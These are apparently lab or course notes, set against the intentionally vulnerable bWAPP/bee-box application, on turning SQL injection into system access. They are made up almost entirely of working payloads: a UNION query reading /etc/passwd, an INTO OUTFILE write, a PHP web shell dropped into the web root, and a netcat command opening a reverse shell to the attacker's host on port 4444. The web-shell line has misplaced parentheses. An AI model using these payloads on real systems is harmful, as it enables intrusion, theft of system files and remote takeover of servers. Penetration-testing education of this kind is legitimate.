SQLi to System Access
Objectives:

-    Utilize SQL Injection to access the local file system of a remote system
-    Leverage SQL Injection to create an interactive connection with a remote system

-    We've seen a lot of what we can do with SQL Injection. Are there any other kinds of things can we accomplish with SQL injection?
#        Lots of dangerous things
#            Local file-system manipulation
-                READ
-                WRITE
-                CODE/COMMAND EXECUTION



#    That does sound dangerous! Can you show use a quick example of reading from the target's local file system?
-        READ from file
-            union all select 1,load_file("/etc/passwd"),3,4,5,6,7 -- -
-                View source for better formatting of output



-    Can we read ANY file we want?
-        Only the files that the SQL user has access to



    You also said we can write, to the local file system. What does that look like?
#        WRITE to file
-            union all select 1,"Test",3,4,5,6,7 into OUTFILE '/var/www/test.txt' -- -
-                You may get permission denied
-                    Find writeable dir
-                        Check links, source, and robots.txt
-                            Trial and error through the listed directories
-                                Found writeable dir: /documents
-                                    CODE/COM EXEC may now be possible :)

#    We can now both READ and WRITE to the Target's local file-system, but how do we leverage this for CODE/COMMAND EXECUTION?
#        CODE EXEC

-            union all select 1,"<?php echo shell_exec($_GET['cmd'];?>)",3,4,5,6,7
-            into OUTFILE '/var/www/bWAPP/documents/x.php'

                Browse to http://bee-box/documents/x.php
                    Success!

    So we were able to add a new page to the website, but what do we do now?
        We listen
            Start a listener on port 4444
                Now browse to your backdoor and execute a command

    http://bee-box/bWAPP/documents/x.php?cmd=nc -nv 10.0.0.169 4444 -e /bin/bash
